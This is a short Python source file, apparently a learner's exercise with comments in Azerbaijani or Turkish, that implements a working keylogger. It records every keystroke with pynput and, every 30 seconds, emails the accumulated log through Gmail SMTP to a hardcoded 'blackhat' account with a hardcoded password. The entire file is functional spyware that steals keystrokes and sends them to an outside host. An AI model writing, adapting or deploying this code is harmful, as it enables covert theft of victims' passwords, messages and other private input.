import pynput.keyboard
import smtplib
import threading

log = ""
def callback_function(key):
    try:
        global log
        log = log + str(key.char)
    except AttributeError:

        log = log + str(key)
    #print(log)

def send_packet(gmail,password,messeng):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(gmail,password)
    email_server.sendmail(gmail,gmail,messeng)
    email_server.quit()

def thred_function():
    global log
    send_packet("blackhat0221@gmail.com","BlackBlackHatHat",log)
    time = threading.Timer(30,thred_function)
    time.start()

keyloger_listen = pynput.keyboard.Listener(on_press=callback_function)
with keyloger_listen:
    thred_function()
    keyloger_listen.join()









#burada biz on_press ile callback funksiyasini verdik ve gelen pacetlerin ekrana derk edilmesi ucun
#bir funksiya yazdiq .

# Biz indi ise bu listener'i ise salmaq ucun with den istifade etmeliyik,
#with bir pacetlerle isleyir , birde dinleme islerinde gorulur.